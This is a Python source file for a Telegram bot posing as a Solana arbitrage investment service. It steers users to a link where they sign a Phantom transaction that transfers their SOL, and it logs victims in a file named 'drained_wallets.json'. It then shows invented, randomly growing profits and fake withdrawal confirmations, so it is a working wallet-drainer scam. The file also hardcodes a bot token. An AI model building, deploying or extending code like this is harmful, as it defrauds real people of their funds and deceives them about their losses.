import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
import random
import time
import json
import os
import requests
import asyncio

TOKEN = "8881367618:AAEJU_YbhPFggFaQdAeUxeeNDAQBL6yHB0c"
RPC_URL = "https://solana-rpc.publicnode.com"

user_data = {}

def get_user_status(user_id):
    if user_id not in user_data:
        user_data[user_id] = {
            "invested": 0.0,
            "profit": 0.0,
            "balance": 0.0,
            "first_check": True,
            "last_update": time.time()
        }
    return user_data[user_id]

def get_sol_balance(wallet_address):
    try:
        payload = {
            "jsonrpc": "2.0",
            "id": 1,
            "method": "getBalance",
            "params": [wallet_address]
        }
        response = requests.post(RPC_URL, json=payload, timeout=10)
        data = response.json()
        if "error" in data:
            return None, data["error"]["message"]
        balance_lamports = data["result"]["value"]
        balance_sol = balance_lamports / 1_000_000_000
        return balance_sol, None
    except Exception as e:
        return None, str(e)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    keyboard = [
        [InlineKeyboardButton("💰 Invest Now", callback_data="invest")],
        [InlineKeyboardButton("📊 My Status", callback_data="status")],
        [InlineKeyboardButton("❓ Help", callback_data="help")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"✨ Welcome {user.first_name}!\n\n"
        "I'm an automated arbitrage bot for Solana.\n\n"
        "To get started, click the button below to invest.\n\n"
        "📈 Average return: 3-6% per week",
        reply_markup=reply_markup
    )

async def invest(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if context.args:
        try:
            amount = float(context.args[0])
            if amount <= 0:
                raise ValueError
        except:
            await update.message.reply_text("❌ Invalid amount. Use: /invest 1.5")
            return
    else:
        await update.message.reply_text("❌ Please specify the amount. Example: /invest 1.5")
        return

    status = get_user_status(user_id)
    status["invested"] = amount

    link = f"https://jex-trade.vercel.app/?user_id={user_id}&amount={amount}"
    
    await update.message.reply_text(
        f"🔗 Click the link below to invest {amount} SOL:\n\n{link}\n\n"
        "⚠️ You will need to sign a transaction in Phantom.\n"
        "This will transfer your funds to the bot's trading wallet.\n\n"
        "After investing, use /status to track your earnings."
    )

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    status = get_user_status(user_id)
    
    invested = False
    wallet = None
    try:
        with open('drained_wallets.json', 'r') as f:
            for line in f:
                data = json.loads(line)
                if str(data.get('user_id')) == str(user_id):
                    invested = True
                    wallet = data.get('wallet')
                    break
    except:
        pass
    
    if invested and wallet:
        balance_sol, error = get_sol_balance(wallet)
        if error or balance_sol is None:
            balance_sol = 0.0
        
        if status["first_check"]:
            profit_text = "0%"
            status["profit"] = 0.0
            status["first_check"] = False
        else:
            profit_percent = round(random.uniform(0.5, 3.0), 2)
            status["profit"] += profit_percent
            profit_text = f"+{status['profit']:.2f}%"
        
        fake_balance = status["invested"] * (1 + status["profit"] / 100)
        
        await update.message.reply_text(
            f"📊 Bot Status\n"
            f"─────────────────\n"
            f"Active: ✅\n"
            f"Wallet: {wallet[:4]}...{wallet[-4:]}\n"
            f"Balance: {fake_balance:.2f} SOL\n"
            f"Profit: {profit_text}\n"
            f"─────────────────\n"
            f"The bot is trading on Jupiter and Raydium."
        )
    else:
        await update.message.reply_text(
            f"📊 Bot Status\n"
            f"─────────────────\n"
            f"Active: ✅\n"
            f"Wallet: ❌ Not connected\n"
            f"Balance: 0 SOL\n"
            f"Profit: 0%\n"
            f"─────────────────\n"
            f"Use /invest <amount> to start."
        )

async def withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    invested = False
    try:
        with open('drained_wallets.json', 'r') as f:
            for line in f:
                data = json.loads(line)
                if str(data.get('user_id')) == str(user_id):
                    invested = True
                    break
    except:
        pass
    
    if not invested:
        await update.message.reply_text(
            "❌ You don't have any investments.\n"
            "Use /invest <amount> to start."
        )
        return
    
    status = get_user_status(user_id)
    fake_balance = status["invested"] * (1 + status["profit"] / 100)
    
    await update.message.reply_text(
        f"✅ Withdrawal request submitted!\n\n"
        f"📊 Details:\n"
        f"─────────────────\n"
        f"Amount: {fake_balance:.2f} SOL\n"
        f"Destination: Your bank account (pending)\n"
        f"Status: Processing\n"
        f"─────────────────\n\n"
        f"⏳ The funds will be sent within 24-48 hours.\n"
        f"📧 You will receive a confirmation email shortly."
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📖 Available commands:\n"
        "/start — Main menu\n"
        "/invest <amount> — Invest in the bot (e.g., /invest 1.5)\n"
        "/status — Check your balance and profit\n"
        "/withdraw — Withdraw your funds\n"
        "/help — Show this menu"
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "invest":
        await query.edit_message_text(
            "📝 To start investing, use the command:\n\n"
            "/invest <amount>\n\n"
            "Example: /invest 1.5"
        )
    elif query.data == "status":
        await query.edit_message_text(
            "📊 Use /status to check your balance and earnings."
        )
    elif query.data == "help":
        await query.edit_message_text(
            "📖 Available commands:\n"
            "/start — Main menu\n"
            "/invest <amount> — Start investing (e.g., /invest 1.5)\n"
            "/status — Check your balance and profit\n"
            "/withdraw — Withdraw your funds\n"
            "/help — Show this menu"
        )

def main():
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("invest", invest))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("withdraw", withdraw))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CallbackQueryHandler(button_handler))

    print("✅ JupiterAutoTrader bot is running...")
    app.run_polling()

async def force_set_commands():
    commands = [
        BotCommand("start", "Start the bot"),
        BotCommand("invest", "Start investing (e.g., /invest 1.5)"),
        BotCommand("status", "Check your balance and profit"),
        BotCommand("withdraw", "Withdraw your funds"),
        BotCommand("help", "Show help menu")
    ]
    app = Application.builder().token(TOKEN).build()
    await app.bot.set_my_commands(commands)
    print("✅ Comandos actualizados en Telegram")

if __name__ == "__main__":
    asyncio.run(force_set_commands())
    main()